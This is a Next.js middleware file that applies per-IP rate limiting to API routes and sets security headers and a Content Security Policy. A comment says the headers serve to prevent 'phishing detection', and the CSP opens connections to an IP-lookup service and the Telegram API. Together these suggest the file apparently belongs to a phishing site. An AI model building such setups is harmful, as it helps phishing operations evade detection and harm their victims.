import { NextResponse } from 'next/server';

// Rate limiting configuration
const rateLimit = new Map();
const RATE_LIMIT_WINDOW = 60 * 1000; // 1 minute
const MAX_REQUESTS = 10; // Max 10 requests per minute per IP

// Helper function to check rate limit
function checkRateLimit(ip) {
    const now = Date.now();
    const userRequests = rateLimit.get(ip) || [];

    // Filter out old requests outside the time window
    const recentRequests = userRequests.filter(
        timestamp => now - timestamp < RATE_LIMIT_WINDOW
    );

    if (recentRequests.length >= MAX_REQUESTS) {
        return false;
    }

    recentRequests.push(now);
    rateLimit.set(ip, recentRequests);
    return true;
}

export function proxy(request) {
    const response = NextResponse.next();

    // Get client IP address
    const ip = request.ip ||
        request.headers.get('x-forwarded-for')?.split(',')[0] ||
        request.headers.get('x-real-ip') ||
        'unknown';

    // Rate limiting for API routes
    if (request.nextUrl.pathname.startsWith('/api/')) {
        if (!checkRateLimit(ip)) {
            return new NextResponse(
                JSON.stringify({
                    success: false,
                    message: 'Too many requests. Please try again later.'
                }),
                {
                    status: 429,
                    headers: {
                        'Content-Type': 'application/json',
                        'Retry-After': '60',
                    },
                }
            );
        }
    }

    // Security Headers - Critical for preventing phishing detection
    response.headers.set('X-DNS-Prefetch-Control', 'on');
    response.headers.set('Strict-Transport-Security', 'max-age=63072000; includeSubDomains; preload');
    response.headers.set('X-Frame-Options', 'SAMEORIGIN');
    response.headers.set('X-Content-Type-Options', 'nosniff');
    response.headers.set('X-XSS-Protection', '1; mode=block');
    response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
    response.headers.set('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');

    // Content Security Policy - Prevents XSS attacks
    response.headers.set(
        'Content-Security-Policy',
        [
            "default-src 'self'",
            "script-src 'self' 'unsafe-eval' 'unsafe-inline'", // Next.js requires unsafe-eval
            "style-src 'self' 'unsafe-inline' fonts.googleapis.com",
            "font-src 'self' fonts.gstatic.com",
            "img-src 'self' data: https:",
            "connect-src 'self' https://api.ipify.org https://api.telegram.org",
            "frame-ancestors 'self'",
        ].join('; ')
    );

    return response;
}

// Configure which paths use this middleware
export const config = {
    matcher: [
        /*
         * Match all request paths except:
         * - _next/static (static files)
         * - _next/image (image optimization files)
         * - favicon.ico (favicon file)
         * - public folder
         */
        '/((?!_next/static|_next/image|favicon.ico|.*\\.(?:svg|png|jpg|jpeg|gif|webp)$).*)',
    ],
};
